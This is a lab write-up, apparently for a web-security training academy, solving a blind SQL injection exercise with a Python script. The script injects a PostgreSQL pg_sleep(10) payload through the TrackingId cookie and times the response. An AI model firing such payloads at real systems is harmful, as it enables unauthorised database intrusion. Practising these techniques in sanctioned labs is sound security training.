# Blind SQL injection with time delays
> This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
   The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.
   To solve the lab, exploit the SQL injection vulnerability to cause a 10 second delay.

```python
import requests
import sys

# --- Configuration ---
# Lab: Blind SQL injection with time delays
# GOAL: Cause a 10-second delay to confirm PostgreSQL injection
TARGET_URL = "https://0aa000c503de74ba829fa601009a00c5.web-security-academy.net/"

def get_session(url):
    """
    Establishes the initial session and verifies the TrackingId cookie exists.
    """
    print(f"[*] Connecting to target...")
    session = requests.Session()
    response = session.get(url)
    
    if "TrackingId" in session.cookies:
        print("[+] Session established.")
        return session
    else:
        print("[-] Error: TrackingId cookie not found.")
        sys.exit(1)
    
def check_time_delay(url, session):
    """
    Injects a time-delay payload and verifies if the server sleeps.
    """
    print("[*] Injecting 10-second sleep payload (PostgreSQL)...")
    
    tracking_id = session.cookies["TrackingId"]
    
    # Payload: Close string, concatenate sleep command, comment out rest.
    # PostgreSQL: || pg_sleep(10)
    payload_cookie = tracking_id + "' || pg_sleep(10) --"
    
    # Send the request
    # Note: This line will 'hang' for 10s if successful
    response = session.get(url, cookies={"TrackingId": payload_cookie})

    # Measure time
    elapsed_time = response.elapsed.total_seconds()
    print(f"[*] Server Response Time: {elapsed_time:.2f} seconds")

    if elapsed_time >= 10:
        print("[SUCCESS] Vulnerability Confirmed! The server slept for > 10 seconds.")
        return True
    else:
        print("[-] Failed. The server responded instantly.")
        return False

if __name__ == "__main__":
    session = get_session(TARGET_URL)
    check_time_delay(TARGET_URL, session)
```